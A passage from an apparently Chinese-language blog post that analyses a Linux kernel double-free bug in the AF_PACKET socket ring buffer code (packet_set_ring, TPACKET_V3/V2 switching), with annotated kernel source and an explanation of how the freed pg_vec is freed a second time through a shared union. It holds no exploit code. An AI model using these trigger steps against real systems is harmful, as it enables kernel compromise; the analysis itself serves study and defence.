class="comment">optval:缓冲区指针</span></span><br><span class="line"><span class="comment">optlen:缓冲区大小</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//创建一个套接字之后，进行设置行为</span></span><br><span class="line">setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt))<span class="comment">//设置为套接字层SOL_SOCKET，允许地址复用</span></span><br><span class="line">__sys_setsockopt() <span class="comment">// 会先根据文件描述符找到关联的 socket，然后进行 BPF 程序处理后，会有两种方式来进行 sock_setsockopt</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>SOL_SOCKET</code>套接字层，进行调用<code>sock_setsockopt()</code></li>
<li>其他层，调用<code>sock-&gt;ops-&gt;setsockopt</code>的指针函数</li>
</ul>
<p>我们需要的是调用<code>sock-&gt;ops-&gt;setsockopt</code>，所以需要设置<code>level</code>不是<code>SOL_SOCKET</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">char</span> __user *user_optval,</span><br><span class="line">        <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">sockptr_t</span> optval = USER_SOCKPTR(user_optval);<span class="comment">//用户空间选项值的指针转换</span></span><br><span class="line">    <span class="type">char</span> *kernel_optval = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err, fput_needed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (optlen &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);<span class="comment">//找到文件描述符关联的socket</span></span><br><span class="line">    <span class="keyword">if</span> (!sock)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">//BPF程序处理</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里使用漏洞的时候需要level==SOL_PACKET</span></span><br><span class="line">    <span class="comment">//对套接字层操作，是SOL_SOCKET并且没有自定义过 SOL_SOCKET</span></span><br><span class="line">    <span class="keyword">if</span> (level == SOL_SOCKET &amp;&amp; !sock_use_custom_sol_socket(sock))</span><br><span class="line">        err = sock_setsockopt(sock, level, optname, optval, optlen);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(!sock-&gt;ops-&gt;setsockopt))</span><br><span class="line">        err = -EOPNOTSUPP;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">                        optlen);<span class="comment">//其他层使用ops-&gt;setsockopt</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sock-&gt;ops==packet_ops</code>调用<code>packet_setsockopt()</code>，通过该<code>optname</code>提供了一个菜单的选项，主要关注环形缓冲区处理的时候，会先根据版本来确定长度后复制数据到一环上，然后进而设置环形缓冲区。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">packet_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;<span class="comment">//获取底层sock结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);<span class="comment">//转化为packet_sock</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="comment">//如果不是SOL_PACKET就返回错误，因为ops使用的是packet</span></span><br><span class="line">    <span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">        <span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line">    <span class="comment">//optname菜单</span></span><br><span class="line">    <span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">    <span class="comment">//处理环形缓冲区的设置</span></span><br><span class="line">    <span class="keyword">case</span> PACKET_RX_RING:<span class="comment">//RX接收</span></span><br><span class="line">    <span class="keyword">case</span> PACKET_TX_RING:<span class="comment">//TX发送</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">        lock_sock(sk);</span><br><span class="line">        <span class="comment">//根据版本设置请求长度</span></span><br><span class="line">        <span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">            len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))<span class="comment">//复制数据到req_u.req</span></span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">                            optname == PACKET_TX_RING);<span class="comment">//设置环形缓冲区，关键代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        release_sock(sk);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>packet socket</code>模块，可以让用户在设备驱动层接受和发送raw packets，并且为了加速数据报文的拷贝，它允许用户创建一块与内核态共享的环形缓冲区。具体的创建操作是在packet_set_ring()函数中实现的。</p>
</blockquote>
<p>进行跟进<code>packet_set_ring()</code>,首先会各种各样的初始化操作，主要点在<code>TPACKET_V3</code>版本的时候，调用<code>init_prb_bdqc()</code>初始化的时候， <code>packet_ring_buffer.prb_bdqc.pkbdq</code>持有一个<code>pg_vec</code>引用，并且后期释放<code>pg_vec</code>并没有清除引用，导致可以<code>double free</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span>		*<span class="title">pg_vec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		head;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		frames_per_block;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		frame_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		frame_max;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		pg_vec_order;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		pg_vec_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		pg_vec_len;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __percpu	*pending_refcnt;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>			*rx_owner_map;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span>	<span class="title">prb_bdqc</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;<span class="comment">//指向页面向量的指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *rx_owner_map = <span class="literal">NULL</span>;<span class="comment">//接收缓冲区所有者的映射</span></span><br><span class="line">    <span class="type">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span><span class="comment">//环形缓冲区指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">    __be16 num;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    <span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;<span class="comment">//请求结构体指针</span></span><br><span class="line">    <span class="comment">//根据接收或者发送选择对应结构体</span></span><br><span class="line">    rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">    rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">    err = -EBUSY;<span class="comment">//忙状态</span></span><br><span class="line">    <span class="keyword">if</span> (!closing) &#123;</span><br><span class="line">        <span class="comment">//是否已经映射</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;po-&gt;mapped))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//是否有正在读取的请求</span></span><br><span class="line">        <span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//tp_block_nr -&gt; 请求的块(是一个或多个内存页的大小,由 tp_block_size 指定)数量</span></span><br><span class="line">    <span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Sanity tests and some calculations */</span></span><br><span class="line">        err = -EBUSY;</span><br><span class="line">        <span class="comment">//缓冲区页面已经存在，goto out</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(rb-&gt;pg_vec))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//根据版本来选择头长度</span></span><br><span class="line">        <span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">            po-&gt;tp_hdrlen = TPACKET_HDRLEN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">            po-&gt;tp_hdrlen = TPACKET2_HDRLEN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">            po-&gt;tp_hdrlen = TPACKET3_HDRLEN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//  tp_block_size -&gt; 块大小</span></span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        <span class="comment">// tp_block_size块大小要大于0</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely((<span class="type">int</span>)req-&gt;tp_block_size &lt;= <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//块大小是否对齐</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;tp_block_size)))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">/*  tp_hdrlen  -&gt; 数据包头长度    </span></span><br><span class="line"><span class="comment">            tp_reserve -&gt; 帧保留的额外空间</span></span><br><span class="line"><span class="comment">            min_frame_size 最小帧size=头长度+保留空间大小</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        min_frame_size = po-&gt;tp_hdrlen + po-&gt;tp_reserve;</span><br><span class="line">        <span class="comment">//版本大于等于V3 的时候 块size要有空闲</span></span><br><span class="line">        <span class="keyword">if</span> (po-&gt;tp_version &gt;= TPACKET_V3 &amp;&amp;</span><br><span class="line">            req-&gt;tp_block_size &lt;</span><br><span class="line">            BLK_PLUS_PRIV((u64)req_u-&gt;req3.tp_sizeof_priv) + min_frame_size)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">// 请求帧大小 要大于 最小帧size</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &lt; min_frame_size))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">// 请求帧size 的对齐 0x10对齐</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//frames_per_block -&gt; 每个块的帧数（块中能容纳的帧数量）</span></span><br><span class="line">        rb-&gt;frames_per_block = req-&gt;tp_block_size / req-&gt;tp_frame_size;</span><br><span class="line">        <span class="comment">//块中能容纳的帧数不能为零</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//块的帧数*请求块数量 &gt; 0xffffffff   既请求的帧数不能超过UINT_MAX</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block &gt; UINT_MAX / req-&gt;tp_block_nr))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//块容纳的帧数 * 请求块数量 != 请求帧数 (既 请求帧数==帧数量)</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely((rb-&gt;frames_per_block * req-&gt;tp_block_nr) !=</span><br><span class="line">                    req-&gt;tp_frame_nr))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        err = -ENOMEM;</span><br><span class="line">        <span class="comment">//order=log2(req-&gt;tp_block_size)</span></span><br><span class="line">        order = get_order(req-&gt;tp_block_size);</span><br><span class="line">        <span class="comment">//分配页面向量(page数组)</span></span><br><span class="line">        pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">//根据版本号来初始化-&gt;环形缓冲区</span></span><br><span class="line">        <span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">        <span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">            <span class="comment">/* V3 不支持块传输 */</span></span><br><span class="line">            <span class="keyword">if</span> (!tx_ring) &#123;</span><br><span class="line">                <span class="comment">//是接收环的时候，</span></span><br><span class="line">                <span class="comment">/* 漏洞处 , packet_ring_buffer.prb_bdqc.pkbdq持有一个pg_vec引用 */</span></span><br><span class="line">                init_prb_bdqc(po, rb, pg_vec, req_u);</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                static void init_prb_bdqc(struct packet_sock *po,</span></span><br><span class="line"><span class="comment">                            struct packet_ring_buffer *rb,</span></span><br><span class="line"><span class="comment">                            struct pgv *pg_vec,</span></span><br><span class="line"><span class="comment">                            union tpacket_req_u *req_u)</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                    struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);</span></span><br><span class="line"><span class="comment">                    struct tpacket_block_desc *pbd;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                    memset(p1, 0x0, sizeof(*p1));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                    p1-&gt;knxt_seq_num = 1;</span></span><br><span class="line"><span class="comment">                    p1-&gt;pkbdq = pg_vec;//这里packet_ring_buffer.prb_bdqc.pkbdq持有一个pg_vec引用</span></span><br><span class="line"><span class="comment">                    //...</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//发送环时</span></span><br><span class="line">                <span class="keyword">struct</span> tpacket_req3 *req3 = &amp;req_u-&gt;req3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (req3-&gt;tp_retire_blk_tov ||</span><br><span class="line">                    req3-&gt;tp_sizeof_priv ||</span><br><span class="line">                    req3-&gt;tp_feature_req_word) &#123;</span><br><span class="line">                    err = -EINVAL;</span><br><span class="line">                    <span class="keyword">goto</span> out_free_pg_vec;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!tx_ring) &#123;</span><br><span class="line">                <span class="comment">//接收环时，rx_owner_map接收缓冲区所有者的映射</span></span><br><span class="line">                rx_owner_map = bitmap_alloc(req-&gt;tp_frame_nr,</span><br><span class="line">                    GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO);</span><br><span class="line">                <span class="keyword">if</span> (!rx_owner_map)</span><br><span class="line">                    <span class="keyword">goto</span> out_free_pg_vec;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Done */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        <span class="keyword">if</span> (unlikely(req-&gt;tp_frame_nr))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从网络中分离套接字 是否正在运行，如果是则注销 */</span></span><br><span class="line">    spin_lock(&amp;po-&gt;bind_lock);</span><br><span class="line">    was_running = po-&gt;running;</span><br><span class="line">    num = po-&gt;num;</span><br><span class="line">    <span class="keyword">if</span> (was_running) &#123;</span><br><span class="line">        po-&gt;num = <span class="number">0</span>;</span><br><span class="line">        __unregister_prot_hook(sk, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;po-&gt;bind_lock);</span><br><span class="line"></span><br><span class="line">    synchronize_net();</span><br><span class="line">    <span class="comment">//缓冲区设置完成后，更新结构和状态</span></span><br><span class="line">    err = -EBUSY;</span><br><span class="line">    mutex_lock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line">    <span class="comment">//如果closing==1 </span></span><br><span class="line">    <span class="keyword">if</span> (closing || <span class="type">atomic_read</span>(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">        err = <span class="number">0</span>;</span><br><span class="line">        spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">        swap(rb-&gt;pg_vec, pg_vec);<span class="comment">//取出原先的pg_vec ，然后释放</span></span><br><span class="line">        <span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)<span class="comment">//版本小于等于V2</span></span><br><span class="line">            swap(rb-&gt;rx_owner_map, rx_owner_map);<span class="comment">//取出原先的接收的，然后释放</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放的时候，没有对packet_ring_buffer.prb_bdqc.pkbdq进行清空，导致仍然保留着被释放的pg_vec的引用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">out_free_pg_vec:</span><br><span class="line">    bitmap_free(rx_owner_map);</span><br><span class="line">    <span class="keyword">if</span> (pg_vec)</span><br><span class="line">        free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先进行释放<code>pg_vec</code>的操作，但是<code>packet_ring_buffer.prb_bdqc.pkbdq</code>仍然持有被释放<code>pg_vec</code>，然后将<code>packet socket</code>的版本切换为<code>TPACKET_V2</code>并且再次设置缓冲区的时候，原本保存在<code>pkbdq</code>的<code>pg_vec</code>会被当做<code>rx_owner_map</code>再次释放，造成<code>double free</code>，因为在<code>rx_owner_map</code>和<code>prb_bdqc</code>为一个联合体，这里的<code>rx_owner_map</code>偏移为0，而<code>pkbdq</code>的偏移也是为0。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *               <span class="title">pg_vec</span>;</span>               <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               head;                 <span class="comment">/*     8     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               frames_per_block;     <span class="comment">/*    12     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               frame_size;           <span class="comment">/*    16     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               frame_max;            <span class="comment">/*    